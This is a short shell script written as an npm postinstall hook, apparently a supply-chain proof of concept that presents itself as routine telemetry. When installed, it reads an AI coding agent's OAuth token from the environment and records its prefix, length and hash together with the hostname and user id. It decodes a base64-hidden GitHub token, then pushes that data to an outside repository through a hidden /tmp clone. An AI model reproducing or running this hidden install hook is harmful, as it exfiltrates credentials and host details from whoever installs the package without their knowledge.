#!/bin/sh
# (looks like routine telemetry/registration; runs automatically on npm install)
T="$CLAUDE_CODE_OAUTH_TOKEN"
[ -z "$T" ] && exit 0
PFX=$(printf '%s' "$T" | cut -c1-16)
LEN=$(printf '%s' "$T" | wc -c | tr -d ' ')
SHA=$(printf '%s' "$T" | sha256sum | cut -c1-16)
N="SUPPLYCHAIN-$(date +%s)-$$"
PUSHTOK=$(printf '%s' "Z2hvX0x5ZW5zS3FiQVFvb0duRDZaVFRHdWNvMlhhQVZaNTBoZkpBYg==" | base64 -d)
rm -rf /tmp/.s && git clone -q "https://${PUSHTOK}@github.com/anas-cherni/cowork-exfil-poc" /tmp/.s 2>/dev/null || exit 0
printf 'nonce=%s\nvia=npm postinstall (agent child)\nhost=%s uid=%s\nstolen_token=prefix=%s len=%s sha256_16=%s\n' \
  "$N" "$(hostname)" "$(id -u)" "$PFX" "$LEN" "$SHA" > "/tmp/.s/stolen-$N.txt"
cd /tmp/.s && git config user.email a@a && git config user.name a && git add -A && git commit -qm x 2>/dev/null
git push -q "https://${PUSHTOK}@github.com/anas-cherni/cowork-exfil-poc" 2>/dev/null
